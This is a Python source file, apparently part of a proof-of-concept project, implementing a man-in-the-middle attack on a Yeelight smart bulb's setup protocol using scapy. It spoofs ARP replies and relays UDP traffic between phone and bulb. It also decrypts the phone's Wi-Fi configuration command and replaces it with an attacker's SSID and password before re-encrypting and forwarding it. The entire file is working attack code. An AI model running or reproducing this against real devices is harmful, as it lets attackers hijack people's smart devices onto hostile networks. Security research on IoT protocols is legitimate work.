from threading import *
from scapy.all import *
from binascii import unhexlify
import time
import json

from .yeelight_message import YeelightMessage
from .message_decryption import decrypt, encrypt, get_md5

class YeelightSocket():
    def __init__(self, ap_iface, attack_iface, ip, mac):
        self.event = Event()

        self.malicious_yeelight_iface = ap_iface
        self.malicious_yeelight_ip = ip
        self.malicious_yeelight_mac = mac

        self.attack_iface = attack_iface
        self.attack_ip = get_if_addr(attack_iface)
        self.attack_mac = get_if_hwaddr(attack_iface)
        self.attack_sport = 4875

        self.yeelight_ip = ip
        self.yeelight_mac = mac
        self.yeelight_port = 54321

        self.rtt = 0
        self.connection_established = False

        self.start_connection_proccess()

    def listen_to_phone(self):
        pkt = sniff(count=1, iface=self.malicious_yeelight_iface, filter=f"udp and (dst port {self.yeelight_port})")
        return pkt

    def listen_to_yeelight(self):
        pkt = sniff(count=1, iface=self.attack_iface, filter=f"udp and (src port {self.yeelight_port})")
        return pkt

    def yeelight_arp_response(self):
        this_mac = get_if_hwaddr(self.attack_iface)
        while not self.connection_established:
            arp = Ether(src=this_mac) 
            arp /= ARP(hwsrc=this_mac,
                psrc="192.168.13.2",
                hwdst=self.yeelight_mac,
                pdst=self.yeelight_ip)

            sendp(arp, count=1, iface=self.attack_iface, verbose=False)
            time.sleep(5)

    def phone_socket(self):
        while not self.connection_established:
            phone_pkt = None
            phone_pkt = self.listen_to_phone()

            self.phone_ip = phone_pkt[0][IP].src
            self.phone_port = phone_pkt[0][UDP].sport
            self.phone_mac = phone_pkt[0][Ether].src

            if self.rtt == 0:
                pkt_from_phone_forward = self.pkt_to_yeelight(phone_pkt[0])
                sendp(pkt_from_phone_forward, iface=self.attack_iface, verbose=False)
            elif self.rtt == 1:
                pkt_from_phone_forward = self.pkt_to_yeelight(phone_pkt[0])
                sendp(pkt_from_phone_forward, iface=self.attack_iface, verbose=False)
            elif self.rtt == 2:
                self.phone_message_wifi = YeelightMessage()
                self.create_from_hexstream(self.phone_message_wifi, phone_pkt[0][Raw].load, False)
                wifi_connection_command = decrypt(self.phone_message_wifi.data, self.yeelight_message_token.md5_checksum)
                print("Recieved: " + str(wifi_connection_command))
                
                self.malicious_phone_message_wifi = YeelightMessage()
                self.malicious_phone_message_wifi.magic_number = self.phone_message_wifi.magic_number
                self.malicious_phone_message_wifi.packet_length = "0"*4
                self.malicious_phone_message_wifi.unknown = self.phone_message_wifi.unknown
                self.malicious_phone_message_wifi.device_id = self.phone_message_wifi.device_id
                self.malicious_phone_message_wifi.stamp = self.phone_message_wifi.stamp
                self.malicious_phone_message_wifi.md5_checksum = self.yeelight_message_token.md5_checksum
                self.malicious_phone_message_wifi.data = str(encrypt(self.malicious_data(wifi_connection_command.decode()), self.yeelight_message_token.md5_checksum).hex())
                print("Sent: " + str(decrypt(self.malicious_phone_message_wifi.data, self.yeelight_message_token.md5_checksum)))
                packet_lenght = format(int(len(self.malicious_phone_message_wifi.message)/2) & 0xffff, "04X")
                self.malicious_phone_message_wifi.packet_length = packet_lenght
                print("Token: " + str(self.yeelight_message_token.md5_checksum))
                print("Data: " + str(self.malicious_phone_message_wifi.data))
                print("Message: " + str(self.yeelight_message_token.message))
                self.malicious_phone_message_wifi.md5_checksum = get_md5(unhexlify(self.malicious_phone_message_wifi.message))
                print("Calulated MD5: " + str(self.malicious_phone_message_wifi.md5_checksum))
                malicious_pkt = phone_pkt[0]
                malicious_pkt[Raw].load = unhexlify(self.malicious_phone_message_wifi.message)
                del malicious_pkt[IP].chksum
                del malicious_pkt[UDP].chksum
                del malicious_pkt[IP].len
                del malicious_pkt[UDP].len
                pkt_from_phone_forward = self.pkt_to_yeelight(malicious_pkt)
                sendp(pkt_from_phone_forward, iface=self.attack_iface, verbose=False)
                
    
    def yeelight_socket(self):
        while not self.connection_established:
            yeelight_pkt = None
            yeelight_pkt = self.listen_to_yeelight()

            if self.rtt == 0:
                pkt_from_yeelight_forward = self.pkt_to_phone(yeelight_pkt[0])
                sendp(pkt_from_yeelight_forward, iface=self.malicious_yeelight_iface, verbose=False)
            elif self.rtt == 1:
                self.yeelight_message_token = YeelightMessage()
                self.create_from_hexstream(self.yeelight_message_token, yeelight_pkt[0][Raw].load, True)             
                pkt_from_yeelight_forward = self.pkt_to_phone(yeelight_pkt[0])
                sendp(pkt_from_yeelight_forward, iface=self.malicious_yeelight_iface, verbose=False)
            elif self.rtt == 2:
                pkt_from_yeelight_forward = self.pkt_to_phone(yeelight_pkt[0])
                sendp(pkt_from_yeelight_forward, iface=self.malicious_yeelight_iface, verbose=False)
                self.connection_established = True
            self.rtt += 1
    
    def start_connection_proccess(self):
        thread_yeelight_arp_response = Thread(target=self.yeelight_arp_response)
        thread_phone_socket = Thread(target=self.phone_socket)
        thread_yeelight_socket = Thread(target=self.yeelight_socket)
        thread_yeelight_arp_response.setDaemon(True)
        thread_phone_socket.setDaemon(True)
        thread_yeelight_socket.setDaemon(True)
        thread_yeelight_arp_response.start()
        thread_phone_socket.start()
        thread_yeelight_socket.start()

    def create_from_hexstream(self, yeelight_message, bytestring, token):
        hex_stream = bytestring.hex()
        yeelight_message._magic_number = hex_stream[0:4]
        yeelight_message._packet_length = hex_stream[4:8]
        yeelight_message._unknown = hex_stream[8:16]
        yeelight_message._device_id = hex_stream[16:24]
        yeelight_message._stamp = hex_stream[24:32]
        if token:
            yeelight_message._md5_checksum = hex_stream[32:]
        else:
            yeelight_message._md5_checksum = hex_stream[32:64]
            yeelight_message._data = hex_stream[64:]
        
    def malicious_data(self, real_command):
        real_command = json.loads(real_command)
        malicious_command = {
            "id":int(time.time()) , 
            "method":real_command["method"],
            "params":{
                "ssid":"Malicious_AP",
                "passwd":"maliciousap123",
                "uid":real_command["params"]["uid"],
                "country_domain":real_command["params"]["country_domain"],
                "tz":real_command["params"]["tz"],
                "gmt_offset":real_command["params"]["gmt_offset"]
            }
        }

        malicious_command = json.dumps(malicious_command, separators=(',', ':'))
        return malicious_command

    def pkt_to_phone(self, pkt):
        pkt[Ether].dst = self.phone_mac
        pkt[Ether].src = self.malicious_yeelight_mac
        pkt[IP].dst = self.phone_ip
        pkt[IP].src = self.malicious_yeelight_ip
        pkt[UDP].dport = self.phone_port
        pkt[UDP].sport = self.yeelight_port
        del pkt[IP].chksum
        del pkt[UDP].chksum

        return pkt

    def pkt_to_yeelight(self, pkt):
        pkt[Ether].dst = self.yeelight_mac
        pkt[Ether].src = self.attack_mac
        pkt[IP].dst = self.yeelight_ip
        pkt[IP].src = self.attack_ip
        pkt[UDP].dport = self.yeelight_port
        pkt[UDP].sport = self.attack_sport
        del pkt[IP].chksum
        del pkt[UDP].chksum

        return pkt
